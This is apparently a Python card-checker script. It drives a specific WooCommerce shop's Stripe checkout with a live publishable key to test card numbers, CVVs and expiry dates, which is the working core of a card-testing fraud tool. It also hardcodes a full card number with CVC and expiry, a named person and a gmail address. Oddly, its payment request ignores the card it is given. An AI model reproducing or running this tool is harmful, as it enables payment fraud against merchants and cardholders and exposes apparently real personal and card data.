from asyncio import sleep
from Checker import Checker, RequestMethods
from aiohttp import ClientSession
from urllib.parse import quote


class StripeWoo(Checker):
    # Headers definition as class attributes
    headers1 = Checker.create_headers_easy("""
        accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        accept-encoding: gzip, deflate, br
        accept-language: es,es-ES;q=0.9,en;q=0.8,pt;q=0.7,am;q=0.6
        user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
    """)

    headers2 = Checker.create_headers_easy("""
        accept: application/json
        accept-encoding: gzip, deflate, br
        accept-language: es,es-ES;q=0.9,en;q=0.8,pt;q=0.7,am;q=0.6
        content-type: application/x-www-form-urlencoded
        origin: https://js.stripe.com
        referer: https://js.stripe.com/
        user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
    """)

    headers3 = Checker.create_headers_easy("""
        accept: application/json, text/javascript, */*; q=0.01
        accept-encoding: gzip, deflate, br
        accept-language: es,es-ES;q=0.9,en;q=0.8,pt;q=0.7,am;q=0.6
        content-length: 358
        content-type: application/x-www-form-urlencoded; charset=UTF-8
        origin: https://ecomxseo.com
        referer: https://ecomxseo.com/student-checkout/
        user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
        x-requested-with: XMLHttpRequest
    """)

    headers4 = Checker.create_headers_easy("""
        accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        accept-encoding: gzip, deflate, br
        accept-language: es,es-ES;q=0.9,en;q=0.8,pt;q=0.7,am;q=0.6
        referer: https://ecomxseo.com/student-checkout/
        user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
    """)

    def __init__(self, cc: str, mes: str, ano: str, cvv: str) -> None:
        super().__init__(cc, mes, ano, cvv)

    async def get_nonce(self) -> str:
        """
        Send a GET request to retrieve the nonce.
        """
        if self.session is None:
            self.session = ClientSession()
        req = await Checker.execRequest(
            url="https://ecomxseo.com/student-checkout/",
            method=RequestMethods.GET,
            headers=self.headers1,
            session=self.session,
        )
        return await req.text()

    async def create_payment_method(self) -> dict:
        """
        Send a POST request to create a payment method.
        """
        req = await Checker.execRequest(
            url="https://api.stripe.com/v1/payment_methods",
            method=RequestMethods.POST,
            headers=self.headers2,
            data="type=card&billing_details[name]=Alex+Varela&billing_details[email]=axusbro%40gmail.com&card[number]=4137574064796123&card[cvc]=222&card[exp_month]=09&card[exp_year]=27&guid=e8737c46-36a3-4b50-b47c-964c23c9a522a7e0b8&muid=80db1c04-06d2-4451-ae74-952b9d0b2690b401a1&sid=48d79dfc-04ca-4537-be86-62c2db3a1879ab5b8e&pasted_fields=number&payment_user_agent=stripe.js%2Fe94b5129e8%3B+stripe-js-v3%2Fe94b5129e8%3B+split-card-element&time_on_page=4192678&key=pk_live_X4XJCkOgA0QdgzZ68dEPyx7B",
            session=self.session,
        )
        return await req.json()

    async def run_check(self) -> None:
        """
        Run the check and complete the checkout process.
        """
        resp1 = await self.get_nonce()
        nonce = Checker.getStr(resp1, 'woocommerce-process-checkout-nonce" value="', '"')

        resp2 = await self.create_payment_method()
        pm = resp2["id"]
        email = quote(self.email)
        await Checker.execRequest(
            url="https://ecomxseo.com/?wc-ajax=checkout&wcf_checkout_id=6081",
            method=RequestMethods.POST,
            headers=self.headers3,
            data=f"billing_first_name=Alex&billing_last_name=Varela&billing_email={email}&order_comments=&_wcf_flow_id=6079&_wcf_checkout_id=6081&coupon_code=&payment_method=stripe&woocommerce-process-checkout-nonce={nonce}&_wp_http_referer=%2Fstudent-checkout%2F%3Fwcf_checkout_id%3D6081%26wc-ajax%3Dupdate_order_review&stripe_source={pm}",
            session=self.session,
        )
        await sleep(3)
        await Checker.execRequest(
            url="https://ecomxseo.com/student-checkout/",
            method=RequestMethods.GET,
            headers=self.headers4,
            session=self.session,
        )

        super().close_connection()
